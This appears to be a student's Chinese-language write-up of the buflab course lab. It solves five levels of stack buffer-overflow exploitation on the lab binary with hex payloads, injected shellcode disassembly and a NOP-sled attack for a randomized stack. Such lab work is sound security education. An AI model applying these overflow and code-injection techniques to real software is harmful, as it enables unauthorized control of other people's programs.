### buflab

##### Level 0

1. 关键函数

   <img src=".\assets\20210410_1.png" style="zoom:80%;" /> 

   * 通过查看 `getbuf` 函数的汇编代码可知：`Gets` 函数输入字符串的地址相对于存放 `getbuf` 函数返回地址的位置的偏移为：`0x28 + 4`

   * `smoke` 函数的起始地址为：`0x08048c18`

     

2. payload

   ```
   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   18 8c 04 08		/* getbuf_fun's ret_address */
   ```

   

3. 结果

   <img src=".\assets\20210410_2.png" style="zoom:80%;" /> 



##### Level 1

1. 关键函数

   <img src=".\assets\20210410_3.png" style="zoom:80%;" />  

   * `fizz` 函数的起始地址为：`0x08048c42`

     

2. payload

   ```
   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   42 8c 04 08		/* getbuf_fun's ret_address */
   00 00 00 00		/* fizz_fun's ret_address	*/
   f4 13 bc 72		/* fizz_fun's parameter		*/
   ```

   

3. 结果

   <img src=".\assets\20210410_4.png" style="zoom:80%;" /> 



##### Level 2

1. 信息

   * 查看 `buf` 地址：`0x55682f58`

     <img src=".\assets\20210410_5.png" style="zoom: 67%;" /> 

   * `bang` 函数的起始地址为：`0x08048c9d`；`global_value` 保存的地址为：`0x804d100`

     <img src=".\assets\20210410_6.png" style="zoom: 67%;" /> 

     <img src=".\assets\20210410_7.png" style="zoom:67%;" /> 

   * shellcode

     ```assembly
     
     temp.o:     file format elf32-i386
     
     
     Disassembly of section .text:
     
     00000000 <.text>:
        0:	c7 05 00 d1 04 08 f4 	movl   $0x72bc13f4,0x804d100
        7:	13 bc 72 
        a:	68 9d 8c 04 08       	push   $0x8048c9d
        f:	c3                   	ret    
     ```

     <img src=".\assets\20210410_9.png" style="zoom:80%;" /> 

     

2. payload

   ```
   c7 05 00 d1 04 08 f4 13 bc 72 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
   58 2f 68 55
   ```

3. 结果

   <img src=".\assets\20210410_8.png" style="zoom:67%;" /> 



##### Level 3

1. 信息

   * `getbuf` 函数返回到 `0x8048dbe`，`leave` 后 `ebp = 0x55682fb0`，所以要在栈中原本放 `ebp` 的位置放 `0x55682fb0`。

   <img src=".\assets\20210410_10.png" style="zoom:67%;" /> 

   * shellcode

     ```assembly
     
     temp.o:     file format elf32-i386
     
     
     Disassembly of section .text:
     
     00000000 <.text>:
        0:	b8 f4 13 bc 72       	mov    $0x72bc13f4,%eax
        5:	68 be 8d 04 08       	push   $0x8048dbe
        a:	c3                   	ret    
     ```

     

   

2. payload

   ```
   b8 f4 13 bc 72 68 be 8d 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   b0 2f 68 55
   58 2f 68 55
   ```

   

3. 结果

   <img src=".\assets\20210410_11.png" style="zoom:67%;" /> 



##### Level 4

1. 知识

   <img src=".\assets\20210410_12.png" style="zoom: 67%;" /> 

   

2. 信息

   * 在 `pwndbg` 中查看  5 次 `getbufn` 函数中 `buf` 的位置，分别为：`0x55682d78, 0x55682d78, 0x55682d38, 0x55682d18, 0x55682d18`。所以必须 `return` 到一个比这 5 个地址都大的位置（我选择 `0x55682e78`），并且在前面要填充的 `0x208` 个字节中，除了最后放置 `shellcode` 之外，其他位置全部填 `0x90` ，形成足够长的 `nop sleds`。

     <img src=".\assets\20210410_13.png" style="zoom:80%;" /> 

   * shellcode

     将 `ebp` 写在栈上让 `0x8049228` 处的 `leave` 指令自动 `pop` 的方式已经不适用，因为地址是动态的。这个 `leave` 的作用其实就是程序流从当前函数退回到父函数的时候，改变 `esp,ebp` （相当于 `mov esp,ebp; pop ebp;`），使其从指向子函数栈帧变成指向父函数栈帧。而且，正常 `leave` 并且 `ret` 之后，在父函数的栈帧中，`esp` 与 `ebp` 之间的相对偏移是确定的（在这里 `ebp - esp = 0x28`），现在已经有 `ret` 后的 `esp` 了，可以在 shellcode 中为 `ebp` 赋值。

     <img src=".\assets\20210410_14.png" style="zoom:80%;" /> 

     ```assembly
     
     temp.o:     file format elf32-i386
     
     
     Disassembly of section .text:
     
     00000000 <.text>:
        0:	8d 6c 24 28          	lea    0x28(%esp),%ebp	; esp + 0x28 -> ebp
        4:	b8 f4 13 bc 72       	mov    $0x72bc13f4,%eax
        9:	68 3a 8e 04 08       	push   $0x8048e3a	; 返回到 0x8048e3a <testn+20>
        e:	c3                   	ret    
     ```

     

3. payload

   ```
   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
   8d 6c 24 28
   b8 f4 13 bc 72 
   68 3a 8e 04 08 
   c3 
   00 00 00 00
   78 2e 68 55
   ```

   

4. 结果

   <img src=".\assets\20210410_15.png" style="zoom:67%;" /> 







